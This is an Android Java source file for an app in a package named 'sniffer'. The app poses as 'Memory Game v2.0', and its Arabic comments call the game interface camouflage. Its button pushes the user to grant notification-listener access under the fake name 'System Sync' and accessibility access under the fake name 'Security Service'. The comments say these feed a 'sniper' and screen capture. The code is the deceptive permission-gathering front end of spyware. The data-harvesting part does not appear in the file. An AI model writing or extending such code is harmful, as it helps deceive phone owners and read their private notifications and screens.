package com.v8.global.sniffer;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // واجهة اللعبة (التمويه)
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(0xFF121212);

        TextView title = new TextView(this);
        title.setText("Memory Game v2.0\nيرجى تفعيل الصلاحيات لبدء اللعب");
        title.setTextColor(0xFF00FF00);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 50);

        Button startBtn = new Button(this);
        startBtn.setText("تفعيل الصلاحيات والبدء");
        
        startBtn.setOnClickListener(v -> {
            // 1. طلب صلاحية قراءة الإشعارات (الأساسية للقناص)
            if (!isNotificationServiceEnabled()) {
                startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
                Toast.makeText(this, "يرجى تفعيل 'System Sync' من القائمة", Toast.LENGTH_LONG).show();
            } 
            // 2. طلب صلاحية الوصول (Accessibility) لالتقاط الشاشة
            else if (!isAccessibilityServiceEnabled()) {
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                Toast.makeText(this, "يرجى تفعيل 'Security Service' من التطبيقات المثبتة", Toast.LENGTH_LONG).show();
            }
            else {
                Toast.makeText(this, "كل الصلاحيات مفعلة! ابدأ اللعب الآن", Toast.LENGTH_SHORT).show();
                // هنا تفتح كود اللعبة الفعلي
            }
        });

        layout.addView(title);
        layout.addView(startBtn);
        setContentView(layout);
    }

    // دالة فحص هل صلاحية الإشعارات مفعلة؟
    private boolean isNotificationServiceEnabled() {
        String pkgName = getPackageName();
        final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");
            for (String name : names) {
                if (pkgName.equals(android.content.ComponentName.unflattenFromString(name).getPackageName())) {
                    return true;
                }
            }
        }
        return false;
    }

    // دالة فحص هل صلاحية الـ Accessibility مفعلة؟
    private boolean isAccessibilityServiceEnabled() {
        int accessibilityEnabled = 0;
        try {
            accessibilityEnabled = Settings.Secure.getInt(this.getContentResolver(), android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {}
        return accessibilityEnabled == 1;
    }
}
